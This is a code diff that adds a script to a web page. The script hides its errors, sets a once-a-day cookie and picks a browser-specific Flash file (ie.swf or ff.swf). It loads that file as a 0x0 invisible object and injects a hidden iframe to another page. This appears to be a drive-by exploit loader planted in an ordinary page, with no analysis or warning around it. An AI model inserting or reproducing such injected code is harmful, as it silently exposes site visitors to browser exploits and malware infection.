@@ -1,0 +1,36 @@
+<SCRIPT LANGUAGE="javascript">
+window.onerror=function(){return true;}
+function init(){document.write();}
+window.onload = init;
+if(document.cookie.indexOf("tyeyede=")==-1)
+{
+var skpaopao=new Date();
+var expires=new Date();
+expires.setTime(expires.getTime()+24*60*60*1000);
+document.cookie="tyeyede=Yes;path=/;expires="+expires.toGMTString();
+if(navigator.userAgent.toLowerCase().indexOf("msie")>0)
+{
+document.write('<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,19,0" width="0" height="0" align="middle">');
+document.write('<param name="allowScriptAccess" value="sameDomain"/>');
+document.write('<param name="movie" value="ie.swf"/>');
+document.write('<param name="quality" value="high"/>');
+document.write('<param name="bgcolor" value="#ffffff"/>');
+document.write('<embed src="ie.swf"/>');
+document.write('</object>');
+}
+else
+{
+document.write("<EMBED src=ff.swf width=0 height=0>");
+}
+}
+document.writeln("<iframe src=next2.htm width=50 height=0><\/iframe>");
+</SCRIPT>
+</BODY></HTML>
+<script type="text/javascript" src="http://js.tongji.cn.yahoo.com/641617/ystat.js"></script><noscript><a href="http://tongji.cn.yahoo.com"><img src="http://img.tongji.cn.yahoo.com/641617/ystat.gif"/></a></noscript>
+
+
+
+
+
+
+
